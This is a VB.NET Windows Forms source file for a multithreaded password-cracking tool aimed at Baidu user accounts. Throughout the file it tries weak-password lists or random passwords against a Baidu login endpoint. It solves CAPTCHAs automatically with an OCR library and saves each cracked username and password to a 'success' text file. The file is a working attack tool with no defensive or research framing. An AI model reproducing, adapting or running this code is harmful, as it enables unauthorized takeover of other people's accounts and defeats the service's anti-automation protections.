﻿Imports System.Net
Imports System.Text
Imports System.IO
Imports System.Threading
Imports System.Text.RegularExpressions
Imports 冰葬.MyFunctions

Public Class Form1

    Private Target As String
    Private DelayTime As Integer
    Private TrNum As Integer
    Private NdStop As Boolean
    Private WeakPWList As String()
    Private PWUbd As Integer
    Private PWLen As Integer
    Private hVcode As Integer
    Private SucSW As StreamWriter
    Private EndCount As Integer

    Public Declare Function LoadLibFromBuffer Lib "Sunday.dll" (ByVal FileBuffer As Byte(), ByVal FileLen As Integer, Optional ByVal Password As String = "123") As Integer
    Public Declare Function GetCodeFromBuffer Lib "Sunday.dll" (ByVal CdsIndex As Integer, ByVal ImgBuffer As Byte(), ByVal ImgBufLen As Integer, ByVal Vcode As Byte()) As Boolean

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        hVcode = LoadLibFromBuffer(My.Resources.baidu, My.Resources.baidu.Length)
    End Sub

    Private Sub StartButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StartButton.Click
        Try
            StartButton.Enabled = False

            If IDTextBox.Text = "" Then
                Throw New Exception("请填写目标")
            End If

            '初始化各参数
            Target = IDTextBox.Text
            TrNum = TrNumeric.Value
            DelayTime = DelayNumeric.Value
            EndCount = TrNum
            NdStop = False

            If Not RandPW.Checked Then '弱密码
                WeakPWList = Split(WeakPW.Text, vbCrLf)
                PWUbd = UBound(WeakPWList)
                If WeakPWList(PWUbd) = "" Then
                    PWUbd -= 1
                End If
                If PWUbd = -1 Then
                    Throw New Exception("请填写弱密码！")
                End If
                Console.ForegroundColor = ConsoleColor.Yellow
                Console.WriteLine(Time() + "开始挖掘...")
                SucSW = New StreamWriter(Directory.GetCurrentDirectory() + "\成功区.txt", True, Encoding.Default)
                SucSW.AutoFlush = True
                For i As Integer = 0 To TrNum - 1
                    Dim Tr As New Thread(AddressOf ListDig)
                    Tr.Start(i)
                Next
            Else '随机
                PWLen = Val(NumTextBox.Text)
                If PWLen < 6 Or PWLen > 14 Then
                    Throw New Exception("请填写适当位数！")
                End If
                Console.ForegroundColor = ConsoleColor.Yellow
                Console.WriteLine(Time() + "开始挖掘...")
                SucSW = New StreamWriter(Directory.GetCurrentDirectory() + "\成功区.txt", True, Encoding.Default)
                SucSW.AutoFlush = True
                For i As Integer = 0 To TrNum - 1
                    Dim Tr As New Thread(AddressOf RanDig)
                    Tr.Start(i)
                Next
            End If
            StopButton.Enabled = True

        Catch ex As Exception
            Console.ForegroundColor = ConsoleColor.Red
            Console.WriteLine(Time() + ex.Message)
            StartButton.Enabled = True
        End Try
    End Sub

    Private Sub StopButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StopButton.Click
        NdStop = True
        Console.ForegroundColor = ConsoleColor.Yellow
        Console.WriteLine(Time() + "用户停止任务，请等待当前线程结束！")
    End Sub

    Private Sub Form1_DragEnter(ByVal sender As System.Object, ByVal e As System.Windows.Forms.DragEventArgs) Handles MyBase.DragEnter
        If e.Data.GetDataPresent(DataFormats.FileDrop) Then '若拖放进来的对象是文件  
            e.Effect = DragDropEffects.All '改变拖放操作的行为，使对象可以被复制或移动至列表视图框  
        End If
    End Sub

    Private Sub Form1_DragDrop(ByVal sender As System.Object, ByVal e As System.Windows.Forms.DragEventArgs) Handles MyBase.DragDrop
        For Each sFile As String In e.Data.GetData(DataFormats.FileDrop) '将拖放进来的文件添加至列表视图框  
            If Microsoft.VisualBasic.Right(sFile, 4) = ".txt" Then
                Dim SR As New StreamReader(sFile, Encoding.Default)
                WeakPW.Text = SR.ReadToEnd()
                SR.Close()
            End If
        Next
    End Sub

    Private Sub LinkLabel1_LinkClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        Process.Start("http://sighttp.qq.com/msgrd?v=3&uin=562826179&site=%c8%d9%c8%d9%c8%ed%bc%fe&menu=yes")
    End Sub

    Private Sub ListDig(ByVal parameter As Integer)
        '弱密码列表
        Dim wc As New WizardHTTP
        wc.AllowAutoRedirect = False
        For i As Integer = parameter To PWUbd Step TrNum
            If NdStop Then
                Exit For
            End If
            If IDTest(wc, Target, WeakPWList(i)) Then
                NdStop = True
                Exit For
            End If
            Thread.Sleep(DelayTime)
        Next i
        EndCount -= 1
        If EndCount = 0 Then
            TrEnd()
        End If
    End Sub

    Private Sub RanDig(ByVal index As Integer)
        '随机密码
        Dim wc As New WizardHTTP
        wc.AllowAutoRedirect = False
        While Not NdStop
            Dim ran As New Random(Environment.TickCount + index)
            Dim tmp As String = ""
            For i = 1 To PWLen
                Dim method As Integer = ran.Next(1, 3)
                If method = 1 Then
                    tmp += ChrW(ran.Next(48, 57))
                ElseIf method = 2 Then
                    tmp += ChrW(ran.Next(65, 90))
                Else
                    tmp += ChrW(ran.Next(97, 122))
                End If
            Next i
            If IDTest(wc, Target, tmp) Then
                NdStop = True
                Exit While
            End If
            Thread.Sleep(DelayTime)
        End While
        EndCount -= 1
        If EndCount = 0 Then
            TrEnd()
        End If
    End Sub

    Private Function IDTest(ByRef wc As WizardHTTP, ByVal id As String, ByVal pw As String)
        Try
            Dim poststr As String = "userName=" + URLEncoUTF8(id) + "&userPwd=" + pw + "&loginStatus=1&loginType=%E7%99%BE%E5%BA%A6%E7%99%BB%E5%BD%95"
            wc.SetDefaultHeader()
            Dim retstr As String = wc.UploadString("http://duokoo.baidu.com/novel/?R=731&pageid=Lrllidwg", poststr)
            Dim rethdr = wc.ResponseHeaders.Get("Set-Cookie")
            While True '循环识别
                Dim left As Integer = retstr.IndexOf("genimage?")
                If left = -1 Then
                    Exit While
                End If
                left += 9
                Dim right As Integer = retstr.IndexOf("""", left)
                Dim vcode As String = retstr.Substring(left, right - left)
                wc.SetDefaultHeader()
                Dim pic As Byte() = wc.DownloadData("http://passport.baidu.com/cgi-bin/genimage?" + vcode)
                Dim bs As String = GetCodeFromLib(pic)
                poststr = "login_bdverify=" + vcode + "&userName=" + URLEncoUTF8(id) + "&userPwd=" + pw + "&loginStatus=1&Check_BDCode=" + bs + "&loginType=%E7%99%BE%E5%BA%A6%E7%99%BB%E5%BD%95"
                wc.SetDefaultHeader()
                retstr = wc.UploadString("http://duokoo.baidu.com/novel/?R=731&pageid=Lrllidwg", poststr)
                rethdr = wc.ResponseHeaders.Get("Set-Cookie")
            End While

            Dim re As New Regex("DK_LOGIN_UID=.{128}; ")

            If re.IsMatch(rethdr) Then
                Console.ForegroundColor = ConsoleColor.Green
                Console.WriteLine(Time() + id + " " + pw + " 挖掘成功！")
                SucSW.WriteLine(id + ":" + pw)
                Return True
            Else
                Console.ForegroundColor = ConsoleColor.Red
                Console.WriteLine(Time() + id + " " + pw + " 挖掘失败！")
                Return False
            End If

        Catch ex As Exception
            Console.ForegroundColor = ConsoleColor.Red
            Console.WriteLine(Time() + ex.Message)
            Return False
        End Try
    End Function

    Private Sub TrEnd() '线程结束后的动作
        SucSW.Close()
        StartButton.Enabled = True
        StopButton.Enabled = False
        Console.ForegroundColor = ConsoleColor.Yellow
        Console.WriteLine(Time() + "已结束。")
    End Sub

    Private Sub Form1_FormClosing(ByVal sender As System.Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles MyBase.FormClosing
        End
    End Sub

    Private Function GetCodeFromLib(ByVal picdata As Byte()) As String
        Dim tmpbs(64 - 1) As Byte
        GetCodeFromBuffer(hVcode, picdata, picdata.Length, tmpbs)
        Return Encoding.Default.GetString(tmpbs).Substring(0, 4)
    End Function
End Class